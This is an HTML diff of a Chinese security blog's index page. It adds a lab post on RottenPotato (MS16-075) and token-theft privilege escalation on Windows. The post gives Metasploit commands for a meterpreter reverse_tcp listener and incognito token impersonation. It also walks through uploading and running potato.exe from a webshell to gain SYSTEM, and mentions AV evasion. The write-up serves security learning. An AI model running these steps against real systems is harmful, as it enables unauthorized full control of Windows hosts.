@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -184,6 +184,117 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86web%E6%8F%90%E6%9D%83system/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="yuanjiu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="元酒InfoSec">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 元酒InfoSec">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86web%E6%8F%90%E6%9D%83system/" class="post-title-link" itemprop="url">烂土豆web提权system</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-03-10 14:10:02 / 修改时间：15:03:53" itemprop="dateCreated datePublished" datetime="2023-03-10T14:10:02+08:00">2023-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">实验</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p><strong>什么是令牌？</strong></p>
+<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
+<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
+<p><strong>令牌种类</strong></p>
+<p>访问令牌(Access Token)：表示访问控制操作主体的系统对象 。<br>会话令牌(Session Token)：是交互会话中唯一的身份标识符。<br>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身 份校验的物理设备，例如 U 盾。<br>      Windows 的 AccessToken 有两种类型：</p>
+<p>Delegation Token：授权令牌，它支持交互式会话登录 (例如本地用户直接 登录、远程桌面登录访问)<br>Impresonation Token：模拟令牌，它是非交互的会话 (例如使用 net use 访问共享文件夹)。<br>      （注：<code>两种 token 只在系统重启后清除 具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation，依旧有效</code>。）<br><strong>窃取过程</strong></p>
+<p>1.生成msf的后门shell</p>
+<p>2上传并运行后门（大概率要做免杀）</p>
+<p>3.msf开启监听（windows）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost x.x.x.x  // 你设置监听的ip</span><br><span class="line">set lport xxx  // 你设置监听的端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>4.成功获取会话</p>
+<p>5.incognito模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">伪造令牌：</span><br><span class="line">use incognito  #加载incognito模块</span><br><span class="line">list_tokens -u  #列出AccessToken</span><br><span class="line">getuid  #查看当前token</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #模拟system 用户，getsystem 命令，即实现了该命令。如果要模拟其他用户，将 token 名改为其他用户即可</span><br><span class="line"></span><br><span class="line">进程窃取令牌</span><br><span class="line">steal_token 1252  #从进程窃取token</span><br><span class="line">getsystem  #提升至system 权限</span><br><span class="line">rev2self  #返回到之前的AccessToken 权限</span><br></pre></td></tr></table></figure>
+
+<h2 id="烂土豆提权（MS16-075）"><a href="#烂土豆提权（MS16-075）" class="headerlink" title="烂土豆提权（MS16-075）"></a><strong>烂土豆提权（MS16-075）</strong></h2><p>ms16-075漏洞介绍：</p>
+<p>​		Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。此更新通过更正Windows服务器消息块 (SMB) 服务器处理凭据转发请求的方式来修复此漏洞。微软将其定义为KB3164038</p>
+<p>RottenPotato（烂土豆）提权的原理可以简述如下：</p>
+<p>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</p>
+<p>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</p>
+<p>3.模仿这个令牌。只有具有“模仿安全令牌权限的账户才能去模仿别人的令牌。一般大多数的服务型账户（llS、MSSQL等）有这个权限，而大多数用户级的账户没有这个权限。</p>
+<p>​		一般从web拿到的webshell都是IS服务器权限，是具有这个模仿权限的。测试过程中，使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用莱刀（llS服务器权限）反弹meterpreter就会成功。</p>
+<p>烂土豆比热土豆的优点是：<br>1.100%可靠<br>2.全版本通杀（<code>现在要做免杀</code>）<br>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用。<br>        总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.拿到webshell，上传烂土豆</span><br><span class="line"></span><br><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line"></span><br><span class="line">2.利用窃取模块列出AccessToken</span><br><span class="line"></span><br><span class="line">cd C:\\Users\\Public </span><br><span class="line"></span><br><span class="line">use incognito </span><br><span class="line"></span><br><span class="line">list_tokens -u</span><br><span class="line"></span><br><span class="line">3.执行烂土豆</span><br><span class="line"></span><br><span class="line">execute -cH -f ./potato.exe </span><br><span class="line"></span><br><span class="line">list_tokens -u </span><br><span class="line"></span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line"></span><br><span class="line">4.窃取成功</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/123429203">https://blog.csdn.net/qq_44159028/article/details/123429203</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44029310/article/details/126110570">https://blog.csdn.net/qq_44029310/article/details/126110570</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
 
     
 
@@ -322,7 +433,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 14:35:47" itemprop="dateModified" datetime="2023-03-07T14:35:47+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-09 11:31:27" itemprop="dateModified" datetime="2023-03-09T11:31:27+08:00">2023-03-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -706,7 +817,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-06 13:51:51" itemprop="dateModified" datetime="2023-03-06T13:51:51+08:00">2023-03-06</time>
+      <time title="修改时间：2023-03-07 15:05:18" itemprop="dateModified" datetime="2023-03-07T15:05:18+08:00">2023-03-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1012,100 +1123,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/02/24/c%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="yuanjiu">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="元酒InfoSec">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 元酒InfoSec">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">应急响应总结</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-02-23 13:03:47" itemprop="dateCreated datePublished" datetime="2023-02-23T13:03:47+08:00">2023-02-23</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-02-27 14:39:19" itemprop="dateModified" datetime="2023-02-27T14:39:19+08:00">2023-02-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="PDCERF-国际权威应急响应流程"><a href="#PDCERF-国际权威应急响应流程" class="headerlink" title="PDCERF(国际权威应急响应流程)"></a>PDCERF(国际权威应急响应流程)</h2><p>PDCERF 方法论是一种防范使用的方法，其将应急响应分成六个阶段，分别是准备阶段、检测阶段、抑制阶段、根除阶段、恢复阶段、总结阶段。</p>
-<p><img src="https://pic1.zhimg.com/v2-0be516bc34e75f8b7f249b989820e340_r.jpg" alt="preview"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/02/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
